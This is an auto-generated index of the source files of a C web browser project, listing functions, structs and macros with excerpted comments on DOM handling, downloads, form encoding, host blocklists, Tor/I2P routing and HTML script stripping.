- `idx_push` (line 656) `static dom_status idx_push(dom_index *idx, lxb_dom_node_t *node, dom_node_id *out_id)` - *return DOM_OK; } dom_status dom_set_document_title(dom_index *idx, const char *text, size_t len) { if (idx == NULL || idx->document == NULL) return DOM_ERR_NULL_ARG; lxb_status_t s = lxb_html_document_title_set((lxb_html_document_t *)idx->document, (const lxb_char_t *)(text != NULL ? text : ""), len); return (s == LXB_STATUS_OK) ? DOM_OK : DOM_ERR_INTERNAL; } /* --- DOM construction (live JS) --- /* Appends an element node to the index, assigning the next handle.*
- `dom_create_element` (line 672) `dom_status dom_create_element(dom_index *idx, const char *tag, dom_node_id *out_id)`
- `dom_append_child` (line 692) `dom_status dom_append_child(dom_index *idx, dom_node_id parent, dom_node_id child)`
- `dom_remove_child` (line 706) `dom_status dom_remove_child(dom_index *idx, dom_node_id parent, dom_node_id child)`
- `dom_set_attribute` (line 714) `dom_status dom_set_attribute(dom_index *idx, dom_node_id node,
                             const...`
- `dom_remove_attribute` (line 743) `dom_status dom_remove_attribute(dom_index *idx, dom_node_id node, const char *name)`
- `index_subtree` (line 753) `static dom_status index_subtree(dom_index *idx, lxb_dom_node_t *sub)` - *} } return DOM_OK; } dom_status dom_remove_attribute(dom_index *idx, dom_node_id node, const char *name) { if (!valid(idx, node) || name == NULL) return DOM_ERR_NULL_ARG; lxb_status_t st = lxb_dom_element_remove_attribute(lxb_dom_interface_element(idx->nodes[node]), (const lxb_char_t *)name, strlen(name)); return (st == LXB_STATUS_OK) ? DOM_OK : DOM_ERR_INTERNAL; } /* Indexes the element subtree rooted at sub (sub included), in pre-order.*
- `dom_set_inner_html` (line 762) `dom_status dom_set_inner_html(dom_index *idx, dom_node_id node,
                              con...`
- `ih_append` (line 815) `static lxb_status_t ih_append(const lxb_char_t *data, size_t len, void *ctx)`
- `ih_free` (line 842) `static void ih_free(ih_acc *a)`
- `dom_get_inner_html` (line 869) `dom_status dom_get_inner_html(const dom_index *idx, dom_node_id node,
                           ...`

**Macros:**
- `_POSIX_C_SOURCE` (line 10)
- `DOM_QS_MAX_SELECTORS` (line 373)
- `IH_BLOCK_SIZE` (line 801)

**Structs:**
- `sm_entry` (line 55)
- `strmap` (line 64)
- `pm_entry` (line 154)
- `ptrmap` (line 160)
- `dom_index` (line 220)
- `ih_block` (line 803)
- `ih_acc` (line 808)

#### `dom_debug.c`
**Path:** `src/dom_debug.c`

**Functions:**
- `dd_putc` (line 30) `static void dd_putc(dd_cursor *c, char ch)`
- `dd_emit` (line 35) `static void dd_emit(dd_cursor *c, const char *s, size_t len)`
- `dd_puts` (line 39) `static void dd_puts(dd_cursor *c, const char *s)`
- `dd_printf` (line 48) `static void dd_printf(dd_cursor *c, const char *fmt, ...)` - *Formats short fixed fields (ints, hex colours, fixed tokens) only; the variable hostile fields go through dd_field. Keeps `need` exact even on the impossible * overflow of the local buffer.*
- `dd_w` (line 80) `static int dd_w(int v)` - *A border/outline width or radius that is unset (PV_LEN_UNSET) or negative reads as * 0 ("no border"); otherwise the value.*
- `dd_color` (line 83) `static void dd_color(dd_cursor *c, int rgb)` - *A border/outline width or radius that is unset (PV_LEN_UNSET) or negative reads as * 0 ("no border"); otherwise the value. static int dd_w(int v) { return (v == PV_LEN_UNSET || v < 0) ? 0 : v; } /* "#rrggbb" for a packed colour, "-" when unset (-1).*
- `dd_display_name` (line 87) `static const char *dd_display_name(int d)`
- `dd_justify_name` (line 95) `static const char *dd_justify_name(int j)`
- `dd_align_name` (line 107) `static const char *dd_align_name(int a)`
- `dd_position_name` (line 117) `static const char *dd_position_name(int p)`
- `dd_visibility_name` (line 128) `static const char *dd_visibility_name(int v)`
- `dd_mix_blend_name` (line 136) `static const char *dd_mix_blend_name(int m)`
- `dd_overflow_name` (line 155) `static const char *dd_overflow_name(int o)`
- `dd_cursor_name` (line 164) `static const char *dd_cursor_name(int c)`
- `dd_text_overflow_name` (line 181) `static const char *dd_text_overflow_name(int t)`
- `dd_inset` (line 187) `static int dd_inset(int v)` - *case CSS_CUR_WAIT:        return "wait"; case CSS_CUR_CROSSHAIR:   return "crosshair"; case CSS_CUR_GRAB:        return "grab"; case CSS_CUR_ZOOM_IN:     return "zoom-in"; case CSS_CUR_NONE:        return "none"; default:                   return "auto"; } } static const char *dd_text_overflow_name(int t) { return (t == CSS_TO_ELLIPSIS) ? "ellipsis" : "clip"; } /* A px inset value for the dump: 0 for unset/auto (so the line stays compact).*
- `dd_object_fit_name` (line 190) `static const char *dd_object_fit_name(int o)`
- `dd_image_rendering_name` (line 201) `static const char *dd_image_rendering_name(int r)`
- `dd_border_style_name` (line 210) `static const char *dd_border_style_name(int s)`
- `dd_box_line` (line 243) `static void dd_box_line(dd_cursor *c, size_t id, const pv_box_def *b)`
- `dd_block_line` (line 296) `static void dd_block_line(dd_cursor *c, size_t i, const rd_block *b)`
- `dd_format` (line 358) `size_t dd_format(const rd_doc *doc, char *out, size_t cap)`
- `dd_format_css` (line 391) `size_t dd_format_css(const rd_doc *doc, char *out, size_t cap)` - *} dd_puts(&c, "[blocks]\n"); for (size_t i = 0; i < nblocks; ++i) { const rd_block *b = rd_at(doc, i); if (b != NULL) dd_block_line(&c, i, b); } /* Always NUL-terminate when there is room for it. if (out != NULL && cap != 0) out[(c.pos < cap) ? c.pos : cap - 1] = '\0'; return c.need; } /* CSS inspector: dumps every element with its full CSS property set.*

**Structs:**
- `dd_cursor` (line 24) - *Bounded write cursor: `pos` bytes are committed to `out` (always leaving room for the terminating NUL); `need` counts every byte that WOULD be written so the caller * gets snprintf semantics even when truncated.*

#### `download.c`
**Path:** `src/download.c`

**Functions:**
- `lc` (line 13) `static int lc(int c)` - *download — pure helpers for "save this resource to disk". See include/download.h and spec/download.md.  #include "download.h" #include "pdf_export.h"   /* pe_safe_basename: the single audited sanitizer #include <ctype.h> #include <string.h> /* ASCII lowercase, locale-independent (the C locale's tolower for bytes < 0x80).*
- `ci_find` (line 19) `static const char *ci_find(const char *hay, const char *needle)` - *#include "download.h" #include "pdf_export.h"   /* pe_safe_basename: the single audited sanitizer #include <ctype.h> #include <string.h> /* ASCII lowercase, locale-independent (the C locale's tolower for bytes < 0x80). static int lc(int c) { if (c >= 'A' && c <= 'Z') return c - 'A' + 'a'; return c; } /* Case-insensitive substring search (ASCII). Returns a pointer into hay or NULL.*
- `media_type` (line 33) `static void media_type(const char *content_type, char *buf, size_t bufsz)` - *Writes the lowercased media type of content_type (the part before ';', with * surrounding spaces trimmed) into buf. Empty/NULL -> empty buf.*
- `dl_should_download` (line 46) `int dl_should_download(const char *content_type, const char *content_disposition)`
- `dl_ext_for_type` (line 57) `const char *dl_ext_for_type(const char *content_type)`
- `copy_span` (line 85) `static void copy_span(const char *src, const char *end, char *buf, size_t bufsz)` - *{ "application/xhtml+xml",  ".html" }, { "text/plain",            ".txt"  }, { "image/png",             ".png"  }, { "image/jpeg",            ".jpg"  }, { "image/gif",             ".gif"  }, { "image/svg+xml",         ".svg"  }, }; for (size_t i = 0; i < sizeof MAP / sizeof MAP[0]; ++i) { if (strcmp(mt, MAP[i].type) == 0) return MAP[i].ext; } return ""; } /* Copies [src, end) into buf, bounded and NUL-terminated.*
- `extract_disposition_name` (line 96) `static int extract_disposition_name(const char *cd, char *buf, size_t bufsz)` - *Extracts a filename candidate from a Content-Disposition value into buf. Handles filename="...", filename=..., and RFC 5987 filename*=charset''value (the part after the second quote; not percent-decoded). Returns 1 if a * non-empty candidate was written.*
- `extract_url_name` (line 134) `static int extract_url_name(const char *url, char *buf, size_t bufsz)` - *Extracts the last path segment of url (without ?query or #fragment) into buf. * Returns 1 if a non-empty candidate was written.*
- `has_extension` (line 148) `static int has_extension(const char *name)` - *Does name already carry an extension (a '.' past the first byte with at least * one character after it)?*
- `dl_pick_name` (line 152) `dl_status dl_pick_name(const char *url, const char *content_disposition,
                       c...`
- `dl_build_path` (line 194) `dl_status dl_build_path(const char *dir, const char *name, char *out, size_t outsz)`
- `dl_check_size` (line 212) `dl_status dl_check_size(size_t len)`

#### `flex_layout.c`
**Path:** `src/flex_layout.c`

**Functions:**
- `nn` (line 18) `static double nn(double v)` - *No I/O, no global state, no dynamic allocation: fixed-size stack scratch buffers bounded by FX_MAX_ITEMS (no VLAs). The flex algorithm follows the CSS single-line model: grow distributes positive free space by grow factor; shrink distributes negative free space by (shrink * basis), freezing any item that hits its minimum and redistributing among the rest; justify-content then places leftover space.  #include "flex_layout.h" #include <stddef.h> #define FX_EPS 1e-9 /* Negative inputs are clamped to zero (CSS treats them as invalid).*
- `fx_flex_line` (line 21) `fx_status fx_flex_line(const fx_item *items, size_t n, double avail, double gap,
                ...`
- `fx_grid_columns` (line 126) `fx_status fx_grid_columns(double avail, size_t ncols, double gap,
                          doubl...`
- `fx_grid_columns_weighted` (line 131) `fx_status fx_grid_columns_weighted(double avail, size_t ncols, double gap,
                      ...`
- `fx_grid_place_span` (line 165) `fx_status fx_grid_place_span(size_t nitems, size_t ncols, const int *span,
                      ...`
- `float_pack_impl` (line 190) `static fx_status float_pack_impl(const double *width, const int *side, size_t n,
                ...` - *Shared packer: wrap == 0 is the single-row v1 contract (overflow clamps in place); wrap != 0 starts a new row (cursors reset) for an item that no longer fits between the cursors, reporting rows via out_row. Half-pixel tolerance so * a 99.8% item is not wrapped by floating-point jitter.*
- `fx_float_pack` (line 229) `fx_status fx_float_pack(const double *width, const int *side, size_t n,
                        d...`
- `fx_float_pack_wrap` (line 234) `fx_status fx_float_pack_wrap(const double *width, const int *side, size_t n,
                    ...`
- `fx_grid_cell` (line 240) `void fx_grid_cell(size_t index, size_t ncols, size_t *row, size_t *col)`
- `fx_justify_name` (line 251) `const char *fx_justify_name(fx_justify j)`

**Macros:**
- `FX_EPS` (line 14)

#### `form.c`
**Path:** `src/form.c`

**Functions:**
- `put_char` (line 17) `static int put_char(char *out, size_t outsz, size_t *pos, char c)` - *No I/O, no global state. The action/names/values are hostile data: encoded (application/x-www-form-urlencoded) and resolved through the canonical url module, never executed. Fails closed: a non-https resolved target yields FM_BLOCKED rather than a downgraded request.  #include "form.h" #include <string.h> const char FM_CONTENT_TYPE_URLENCODED[] = "application/x-www-form-urlencoded"; /* Appends one byte, keeping room for the trailing NUL. Returns -1 on overflow.*
- `enc_component` (line 25) `static int enc_component(const char *s, char *out, size_t outsz, size_t *pos)` - *Encodes one component per the WHATWG application/x-www-form-urlencoded byte * serialiser. Returns -1 on overflow.*
- `fm_encode` (line 42) `fm_status fm_encode(const fm_field *fields, size_t n,
                    char *out, size_t outsz...`
- `copy_fit` (line 66) `static int copy_fit(char *dst, size_t dstsz, const char *src)` - *if (fields[i].name == NULL) continue; /* a nameless control is not submitted if (!first && put_char(out, outsz, &pos, '&') != 0) { out[0] = '\0'; return FM_ERR_OVERFLOW; } first = 0; if (enc_component(fields[i].name, out, outsz, &pos) != 0) { out[0] = '\0'; return FM_ERR_OVERFLOW; } if (put_char(out, outsz, &pos, '=') != 0) { out[0] = '\0'; return FM_ERR_OVERFLOW; } const char *v = (fields[i].value != NULL) ? fields[i].value : ""; if (enc_component(v, out, outsz, &pos) != 0) { out[0] = '\0'; return FM_ERR_OVERFLOW; } } out[pos] = '\0'; if (out_len != NULL) *out_len = pos; return FM_OK; } /* Copies src into dst if it fits (including the NUL). Returns -1 on overflow.*
- `clean_action` (line 75) `static int clean_action(const char *action, char *out, size_t outsz)` - *Removes TAB/LF/CR and trims leading/trailing ASCII spaces (WHATWG cleaning of a * URL-bearing attribute). Returns -1 if the cleaned value does not fit.*
- `strip_query` (line 93) `static void strip_query(char *url)` - *if (c == '\t' || c == '\n' || c == '\r') continue; if (o + 1 >= outsz) return -1; out[o++] = c; } out[o] = '\0'; size_t s = 0, e = o; while (s < e && out[s] == ' ') ++s; while (e > s && out[e - 1] == ' ') --e; if (s > 0) memmove(out, out + s, e - s); out[e - s] = '\0'; return 0; } /* Truncates url at the first '?' or '#' (drops query and fragment in place).*
- `resolve_target` (line 101) `static fm_block_reason resolve_target(const char *base, const char *act,
                        ...` - *Resolves the cleaned action into a validated absolute https URL R, or returns a * block reason.*
- `fm_build` (line 119) `fm_status fm_build(const char *base, const char *action, fm_method method,
                   con...`

#### `freebug.c`
**Path:** `src/freebug.c`

**Functions:**
- `fb_buffer_init` (line 14) `void fb_buffer_init(fb_buffer *b)` - *include <stdlib.h> include <string.h>*
- `fb_buffer_push` (line 18) `int fb_buffer_push(fb_buffer *b, int level, const char *text, size_t len)`
- `fb_buffer_push_loc` (line 22) `int fb_buffer_push_loc(fb_buffer *b, int level, const char *text, size_t len,
                   ...`
- `fb_buffer_reset` (line 77) `void fb_buffer_reset(fb_buffer *b)`
- `fb_buffer_free` (line 90) `void fb_buffer_free(fb_buffer *b)`
- `fb_buffer_count` (line 100) `size_t fb_buffer_count(const fb_buffer *b)`
- `fb_buffer_at` (line 104) `const fb_entry *fb_buffer_at(const fb_buffer *b, size_t i)`
- `fb_level_name` (line 109) `const char *fb_level_name(int level)`

#### `freedom.c`
**Path:** `src/freedom.c`

**Functions:**
- `print_usage` (line 41) `static void print_usage(FILE *fp, const char *prog)` - *define EXIT_OK     0 define EXIT_ERROR  1 define EXIT_USAGE  2*
- `is_https_url` (line 61) `static int is_https_url(const char *s)`
- `is_http_url` (line 65) `static int is_http_url(const char *s)`
- `is_overlay_http` (line 71) `static int is_overlay_http(const char *s)` - *fprintf(fp, "  --dump-dom: headless, print the paint-ready render tree (blocks, boxes, containers) to stdout\n"); fprintf(fp, "  --dump-css: headless, print the resolved CSS property dump (boxes + block properties) to stdout\n"); fprintf(fp, "  --dump-layout: headless, print the resolved layout (box rects + positioned boxes) to stdout\n"); } static int is_https_url(const char *s) { return strncmp(s, "https://", 8) == 0; } static int is_http_url(const char *s) { return strncmp(s, "http://", 7) == 0; } /* A plain-http overlay URL (an i2p eepsite today): fetched over the network, not a file.*
- `read_file` (line 134) `static char *read_file(const char *path, size_t *out_len)` - */* HTTP Basic Authentication for headless mode. Set by --user=username:password. static char g_auth_user[256] = ""; static char g_auth_pass[256] = ""; /* Tor/I2P routing for headless mode (off by default; opt-in via CLI flags). static nr_config global_net = { 0, 0, 0 }; static char global_tor_addr[64] = "127.0.0.1:9050"; static char global_i2p_addr[64] = "127.0.0.1:4444"; static hb_set *g_hosts = NULL; static hb_set *g_impersonate = NULL; /* impersonate.conf: triple-opt-in TLS-blend hosts /* Reads the whole file into a NUL-terminated buffer. Caller frees with free().*
- `headless_load_hosts` (line 151) `static void headless_load_hosts(void)`
- `is_blank_text` (line 190) `static int is_blank_text(const char *s)` - *impersonate.conf lives in the same search dirs; load it as an allowlist so * hb_is_allowlisted answers the third gate signal (covers subdomains). if (g_impersonate != NULL) { n = snprintf(path, sizeof path, "%s/impersonate.conf", dirs[i]); if (n > 0 && (size_t)n < sizeof path) { char *itxt = read_file(path, NULL); if (itxt != NULL) { hb_load(g_impersonate, itxt, HB_LIST_ALLOW); free(itxt); } } } } } /* True if s holds only ASCII spaces/tabs (or is empty).*
- `print_doc` (line 203) `static void print_doc(const rd_doc *doc)` - *Writes the render document as deterministic, flowing plain text for a terminal and for an AI agent (content as data, never instruction). Inline runs (paragraphs and links) flow onto one line and break on a block boundary; headings get a leading "#"*level marker, images show their gate decision and source, and notices are prefixed with "! ". It is the same rd_doc the GUI * paints.*
- `print_console` (line 296) `static void print_console(const fb_buffer *log)` - *Prints the captured Freebug console (the developer-visible JS transcript) to stdout, one entry per line, prefixed with its level and (for located errors) its source name:line:col. Deterministic order; an empty buffer prints just the * header so "nothing logged" is unambiguous.*
- `print_dom` (line 313) `static void print_dom(const rd_doc *doc)` - *Prints the paint-ready render tree (dom_debug) to stdout. Two-pass: measure, then allocate exactly and format. The dump is bounded by the document; dd_format never * overruns and allocates nothing itself.*
- `print_dom_css` (line 328) `static void print_dom_css(const rd_doc *doc)` - *Prints the CSS property inspector (dd_format_css) to stdout. Same contract as * print_dom: two-pass measure-then-allocate.*
- `headless_fetch` (line 352) `static int headless_fetch(void *ctx, const char *method, const char *url,
                       ...` - *tab_fetch_fn for the headless renderer: a policy-checked subresource fetch for page XHR/fetch and external <script src>. ctx is the page's top URL (or NULL for a local file): the RAW url from the worker is resolved against it with ln_resolve, the same gate a click gets (https-only, no downgrade, no foreign scheme), so relative subresources work. Realm-routed (fail-closed); no per-host allowlist here (headless is operator-driven -- enabling --js is the trust signal). The confined worker never * touches a socket; this runs in the trusted parent.*
- `foldback_cookies` (line 410) `static void foldback_cookies(const char *url, const char *jar)` - *Folds a page's document.cookie jar ("a=1; b=2") back into the ephemeral network * jar, one pair at a time, so JS-set session cookies reach the next request.*
- `render_page` (line 425) `static int render_page(const char *html, size_t len, const char *top_url,
                       ...`
- `sf_reason` (line 600) `static const char *sf_reason(sf_status ss)`
- `fetch_and_render_one` (line 620) `static int fetch_and_render_one(const char *url, char **out_nav)` - *Fetches one url with secure_fetch and renders the result. The response body is * consumed directly; no extra copy is made. out_nav as in render_page.*
- `elsewhere` (line 678) `* page whose script immediately forwards elsewhere (e.g. a search engine's
 * JS-capability inter...`
- `run_headless` (line 696) `static int run_headless(const char *target)`
- `main` (line 728) `int main(int argc, char **argv)`

**Macros:**
- `_POSIX_C_SOURCE` (line 8)
- `_DEFAULT_SOURCE` (line 10)
- `EXIT_OK` (line 37)
- `EXIT_ERROR` (line 39)
- `EXIT_USAGE` (line 40)
- `HL_JS_NAV_MAX` (line 616)

#### `hls.c`
**Path:** `src/hls.c`

**Functions:**
- `last_char` (line 38) `static const char *last_char(const char *s, size_t n, int c)` - *Finds the last occurrence of character `c` in `s` (length `n`). * Returns NULL if not found. Pure, no _GNU_SOURCE dependency.*
- `parse_attr_long` (line 48) `static int parse_attr_long(const char *attrs, const char *end,
                           const c...` - *Extracts a named attribute value from an #EXT-X-STREAM-INF attribute string. attr is the attribute name (e.g. "BANDWIDTH="); end points to end of the line. * Writes the parsed long into *val. Returns 1 on success, 0 otherwise.*
- `parse_attr_resolution` (line 62) `static void parse_attr_resolution(const char *attrs, const char *end,
                           ...` - *static int parse_attr_long(const char *attrs, const char *end, const char *attr, long *val) { size_t alen = strlen(attr); const char *p = (const char *)memmem(attrs, (size_t)(end - attrs), attr, alen); if (p == NULL) return 0; p += alen; char *endp = NULL; long v = strtol(p, &endp, 10); if (endp == p) return 0; val = v; return 1; } /* Extracts a RESOLUTION=WxH attribute. Writes w and h only (default 0).*
- `hls_parse` (line 79) `hls_status hls_parse(const char *text, size_t len, hls_playlist **out)`
- `hls_select_variant` (line 201) `size_t hls_select_variant(const hls_playlist *pl, int max_w, int max_h)`
- `hls_resolve_url` (line 222) `size_t hls_resolve_url(const char *base_url, const char *segment_url,
                       char...`
- `hls_playlist_free` (line 252) `void hls_playlist_free(hls_playlist *pl)`

**Macros:**
- `_GNU_SOURCE` (line 20)
- `_POSIX_C_SOURCE` (line 22)

#### `hostblock.c`
**Path:** `src/hostblock.c`

**Functions:**
- `table_probe` (line 38) `static size_t table_probe(const hb_table *t, const char *key, size_t klen)` - *Finds the slot for key (length klen) in t, which must have a free slot. Returns * the index of either the matching entry or the first empty slot for it.*
- `table_grow` (line 49) `static int table_grow(hb_table *t, size_t newcap)` - *Finds the slot for key (length klen) in t, which must have a free slot. Returns * the index of either the matching entry or the first empty slot for it. static size_t table_probe(const hb_table *t, const char *key, size_t klen) { size_t mask = t->cap - 1; size_t i = (size_t)fnv1a(key, klen) & mask; while (t->slots[i] != NULL) { if (strlen(t->slots[i]) == klen && memcmp(t->slots[i], key, klen) == 0) break; i = (i + 1) & mask; } return i; } /* Grows (or first-allocates) t to newcap slots and rehashes. Returns 0, -1 OOM.*
- `table_insert` (line 71) `static int table_insert(hb_table *t, const char *key, size_t klen)` - *Inserts key (length klen) into t, deduping. Returns 0 (inserted or already * present), -1 on OOM.*
- `table_contains` (line 91) `static int table_contains(const hb_table *t, const char *key)`
- `table_free` (line 97) `static void table_free(hb_table *t)`
- `lower` (line 106) `static char lower(char c)` - *static int table_contains(const hb_table *t, const char *key) { if (t->cap == 0) return 0; size_t i = table_probe(t, key, strlen(key)); return t->slots[i] != NULL; } static void table_free(hb_table *t) { if (t->slots == NULL) return; for (size_t i = 0; i < t->cap; ++i) free(t->slots[i]); free(t->slots); t->slots = NULL; t->cap = 0; t->count = 0; } /* --- token helpers ---*
- `is_ip_token` (line 113) `static int is_ip_token(const char *s, size_t n)` - *A token made only of digits, '.' and ':' is an IP literal (v4 or v6), not a * domain. An empty token never reaches here.*
- `is_domain_char` (line 122) `static int is_domain_char(char c)` - *A token made only of digits, '.' and ':' is an IP literal (v4 or v6), not a * domain. An empty token never reaches here. static int is_ip_token(const char *s, size_t n) { for (size_t i = 0; i < n; ++i) { char c = s[i]; if (!((c >= '0' && c <= '9') || c == '.' || c == ':')) return 0; } return 1; } /* True if c may appear in a domain we accept (after lowercasing).*
- `hb_new` (line 143) `hb_set *hb_new(void)` - *token is not a domain we accept (caller skips it). static size_t normalise_domain(const char *tok, size_t n, char *out, size_t out_size) { if (n == 0 || n + 1 > out_size) return 0; for (size_t i = 0; i < n; ++i) out[i] = lower(tok[i]); out[n] = '\0'; if (out[n - 1] == '.') { --n; out[n] = '\0'; }  /* trim one trailing dot if (n == 0 || n > HB_MAX_HOST) return 0; for (size_t i = 0; i < n; ++i) { if (!is_domain_char(out[i])) return 0; } return n; } /* --- public ---*
- `hb_free` (line 148) `void hb_free(hb_set *s)`
- `hb_load` (line 155) `hb_status hb_load(hb_set *s, const char *text, hb_list list)`
- `hb_check` (line 192) `hb_decision hb_check(const hb_set *s, const char *host)`
- `hb_is_allowlisted` (line 217) `int hb_is_allowlisted(const hb_set *s, const char *host)`
- `hb_count` (line 237) `size_t hb_count(const hb_set *s, hb_list list)`

**Macros:**
- `HB_MAX_HOST` (line 18)
- `HB_INIT_CAP` (line 20)

**Structs:**
- `hb_table` (line 24)
- `hb_set` (line 30)

#### `hostedit.c`
**Path:** `src/hostedit.c`

**Functions:**
- `he_lower` (line 11) `static char he_lower(char c)` - *include <string.h>*
- `is_label_char` (line 15) `static int is_label_char(char c)`
- `valid_host` (line 22) `static int valid_host(const char *host, size_t n)` - *#include "hostedit.h" #include <string.h> static char he_lower(char c) { return (c >= 'A' && c <= 'Z') ? (char)(c - 'A' + 'a') : c; } static int is_label_char(char c) { return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-'; } /* True if host is a plausible registrable hostname (see he_make_line contract).*
- `he_make_line` (line 40) `he_status he_make_line(const char *host, char *out, size_t cap)`
- `is_ip_token` (line 67) `static int is_ip_token(const char *ts, const char *te)` - *True if the token looks like an IPv4 dotted-quad / contains only digits and dots * (matches hostblock's is_ip_token spirit: such a leading token is the ignored IP).*
- `he_scan` (line 80) `static int he_scan(const char *text, int (*fn)(const char *, size_t, void *), void *ctx)` - *Visits each domain token (non-comment, non-IP) of a hosts-format text in document order, calling fn(ts, tl, ctx). If fn returns nonzero, iteration stops and he_scan * returns 1; otherwise 0. Single source of the line/token tokenisation.*
- `has_host_cb` (line 104) `static int has_host_cb(const char *ts, size_t tl, void *ctx)`
- `he_text_has_host` (line 108) `int he_text_has_host(const char *text, const char *host)`
- `contains_ci` (line 115) `static int contains_ci(const char *hs, size_t hl, const char *needle)` - *} return 0; } static int has_host_cb(const char *ts, size_t tl, void *ctx) { return token_eq_host(ts, ts + tl, (const char *)ctx); } int he_text_has_host(const char *text, const char *host) { if (text == NULL || host == NULL || host[0] == '\0') return 0; return he_scan(text, has_host_cb, (void *)host); } /* Lowercase substring search: 1 if needle (lowercased) occurs in [hs,he).*
- `starts_with_ci` (line 127) `static int starts_with_ci(const char *hs, size_t hl, const char *pfx)`
- `suggest_cb` (line 143) `static int suggest_cb(const char *ts, size_t tl, void *vctx)`
- `he_suggest` (line 163) `int he_suggest(const char *text, const char *query,
               char results[][HE_MAX_HOST + 1...`

**Structs:**
- `suggest_ctx` (line 136)

#### `html_parse.c`
**Path:** `src/html_parse.c`

**Functions:**
- `dup_bytes` (line 25) `static char *dup_bytes(const lxb_char_t *src, size_t len)` - *#include "html_parse.h" #include <stdlib.h> #include <string.h> #include <lexbor/html/html.h> #include <lexbor/dom/dom.h> #include <lexbor/tag/const.h> struct hp_document { lxb_html_document_t *doc; }; /* --- helpers ---*
- `node_next` (line 36) `static lxb_dom_node_t *node_next(lxb_dom_node_t *node, const lxb_dom_node_t *root)` - *}; /* --- helpers --- static char *dup_bytes(const lxb_char_t *src, size_t len) { if (len == (size_t)-1) return NULL; /* guard: len+1 would overflow to 0 char *out = (char *)malloc(len + 1); if (out == NULL) return NULL; if (len != 0 && src != NULL) memcpy(out, src, len); out[len] = '\0'; return out; } /* Iterative pre-order successor of node within the subtree rooted at root.*
- `attr_is_event_handler` (line 45) `static int attr_is_event_handler(const lxb_dom_attr_t *attr)`
- `node_is_script` (line 52) `static int node_is_script(const lxb_dom_node_t *node)`
- `strip_scripts` (line 58) `static void strip_scripts(lxb_html_document_t *document)`
- `mem_contains_ci` (line 85) `static int mem_contains_ci(const lxb_char_t *hay, size_t hlen, const char *needle)` - *Case-insensitive (ASCII) substring test over a length-delimited attribute value. * needle must be lowercase letters.*
- `script_classify` (line 109) `static int script_classify(const lxb_dom_node_t *n,
                           const lxb_char_t *...` - *Classifies a <script>: a classic program runs only when its type is absent/empty or a JavaScript MIME type (contains "javascript"/"ecmascript"). Every other type is a data block the browser never executes -- JSON/LD data, ES modules (import/export cannot run as a classic script), and template blocks like text/x-jquery-tmpl / text/html / text/template (executing their markup throws a SyntaxError; this was Slashdot's "#each" errors). Fail closed: unrecognized type -> skip. A src attribute makes it external (its inline body, if any, is ignored -- browser rule); otherwise it runs from its inline source. The parser never fetches: external scripts are only REPORTED with their raw src. Mirrors * ctype_is_javascript in tab.c (same rule for the fetched Content-Type).*
- `hp_extract_script_list` (line 138) `hp_script *hp_extract_script_list(const hp_document *doc, size_t *out_count)` - *Collects each executable <script> as its own entry, in document order: inline source for classic inline scripts, the raw src attribute for external ones. Browsers run each <script> as a separate program, so the worker evaluates them one by one: an uncaught exception in one script must not abort the others (concatenating into a single eval would let the first failure kill them all). Bounded by HP_MAX_SCRIPTS (fail-closed anti-DoS). NULL with *out_count == 0 when * there are none or on allocation failure; release with hp_free_scripts.*
- `hp_free_scripts` (line 191) `void hp_free_scripts(hp_script *scripts, size_t count)`
- `attr_has_token_ci` (line 205) `static int attr_has_token_ci(const lxb_char_t *val, size_t vlen, const char *needle)` - *Whitespace-separated token test over a length-delimited attribute value, ASCII case-insensitive: rel="preload stylesheet" has the token "stylesheet"; * rel="notstylesheet" does not. needle must be lowercase.*
- `link_is_active_stylesheet` (line 226) `static int link_is_active_stylesheet(lxb_dom_element_t *el,
                                     ...` - *An applicable stylesheet <link>: rel token "stylesheet" and not "alternate"; a non-empty href; media absent/empty or mentioning screen/all (fail closed). * On a match, href and hlen point into the element's attribute storage.*
- `hp_extract_stylesheet_hrefs` (line 247) `char **hp_extract_stylesheet_hrefs(const hp_document *doc, size_t *out_count)`
- `hp_free_stylesheet_hrefs` (line 281) `void hp_free_stylesheet_hrefs(char **hrefs, size_t count)`
- `strip_event_handlers` (line 287) `static void strip_event_handlers(lxb_html_document_t *document)`
- `hp_config_default` (line 310) `hp_config hp_config_default(void)` - *for (lxb_dom_attr_t *attr = lxb_dom_element_first_attribute(el); attr != NULL; attr = lxb_dom_element_next_attribute(attr)) { if (attr_is_event_handler(attr)) { (void)lxb_dom_element_attr_remove(el, attr); again = 1; /* iterator invalidated; restart this element break; } } } } } /* --- public: config & validator ---*
- `hp_validate_input` (line 318) `hp_status hp_validate_input(const char *html, size_t len, const hp_config *cfg)`
- `hp_parse` (line 328) `hp_status hp_parse(const char *html, size_t len, const hp_config *cfg, hp_document **out)` - *c.strip_scripts = 1; c.strip_event_handlers = 1; return c; } hp_status hp_validate_input(const char *html, size_t len, const hp_config *cfg) { if (html == NULL) return HP_ERR_NULL_ARG; size_t cap = (cfg != NULL && cfg->max_bytes != 0) ? cfg->max_bytes : HP_DEFAULT_MAX_BYTES; if (len == 0) return HP_ERR_EMPTY; if (len > cap) return HP_ERR_TOO_LARGE; return HP_OK; } /* --- public: parse ---*
- `hp_element_count` (line 362) `size_t hp_element_count(const hp_document *doc)` - *if (local.strip_scripts) strip_scripts(document); if (local.strip_event_handlers) strip_event_handlers(document); hp_document *wrap = (hp_document *)malloc(sizeof *wrap); if (wrap == NULL) { lxb_html_document_destroy(document); return HP_ERR_OOM; } wrap->doc = document; out = wrap; return HP_OK; } /* --- public: queries ---*
- `hp_script_count` (line 372) `size_t hp_script_count(const hp_document *doc)`
- `hp_event_handler_count` (line 382) `size_t hp_event_handler_count(const hp_document *doc)`
- `hp_extract_text` (line 398) `char *hp_extract_text(const hp_document *doc, size_t *out_len)`
- `hp_get_title` (line 417) `char *hp_get_title(const hp_document *doc, size_t *out_len)`
- `hp_free` (line 432) `void hp_free(char *buf)` - *char *hp_get_title(const hp_document *doc, size_t *out_len) { if (out_len != NULL) *out_len = 0; if (doc == NULL || doc->doc == NULL) return NULL; size_t len = 0; const lxb_char_t *title = lxb_html_document_title(doc->doc, &len); if (title == NULL) return dup_bytes((const lxb_char_t *)"", 0); char *copy = dup_bytes(title, len); if (copy != NULL && out_len != NULL) *out_len = len; return copy; } /* --- public: cleanup ---*
- `hp_document_free` (line 436) `void hp_document_free(hp_document *doc)`
- `hp_document_root` (line 442) `const void *hp_document_root(const hp_document *doc)`

**Macros:**
- `_POSIX_C_SOURCE` (line 8)

**Structs:**
- `hp_document` (line 20)

#### `image_decode.c`
**Path:** `src/image_decode.c`

**Functions:**
- `read_be32` (line 51) `static uint32_t read_be32(const uint8_t *p)`
